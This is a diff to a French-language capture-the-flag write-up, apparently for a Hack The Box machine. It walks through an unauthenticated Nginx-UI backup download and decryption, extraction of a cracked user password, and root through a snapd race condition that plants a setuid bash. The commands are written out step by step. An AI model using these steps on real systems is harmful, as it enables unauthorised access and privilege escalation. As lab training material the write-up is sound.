@@ -28,12 +28,12 @@ Bashecho "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
 echo "10.129.242.192 admin.snapped.htb" | sudo tee -a /etc/hosts
 Fuzzing des sous-domaines → découverte de admin.snapped.htb (Nginx-UI).
 
-Foothold - CVE-2026-27944
+## Foothold - CVE-2026-27944
 Bashffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
 Endpoint intéressant : /api/backup
 Bashcurl -OJ http://admin.snapped.htb/api/backup
 Le header X-Backup-Security contient key:iv.
-Décryptage du backup
+## Décryptage du backup
 Bash# Extraction key & iv
 key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
 iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
@@ -43,13 +43,13 @@ cd backup
 
 openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
 unzip nginxui_decrypted.zip
-Extraction des credentials
+## Extraction des credentials
 Bashsqlite3 database.db "select * from users;"
 Hash bcrypt cracked → jonathan:linkinpark
 Bashssh jonathan@snapped.htb
 User flag récupéré.
 
-Privilege Escalation - CVE-2026-3888 (Snapd)
+## Privilege Escalation - CVE-2026-3888 (Snapd)
 Reconnaissance
 Bashsnap --version
 # snapd 2.63.1+24.04 → vulnérable
@@ -75,18 +75,18 @@ Dans le shell BusyBox :
 Bashcp /bin/bash /var/snap/firefox/common/bash
 chmod 04755 /var/snap/firefox/common/bash
 exit
-4. Root final
+## Root final
 Bash/var/snap/firefox/common/bash -p
 id
 cat /root/root.txt
 Root obtenu !
 
-Exploit Components
+## Exploit Components
 firefox_2404.c (Race Helper)
 librootshell.c (Shellcode ld-linux)
 (Les sources complètes sont disponibles dans le dossier exploit/ de ce repo)
 
-Résumé des Techniques
+## Résumé des Techniques
 
 Exfiltration de backup non authentifiée (CVE-2026-27944)
 TOCTOU Race Condition sur snap-confine
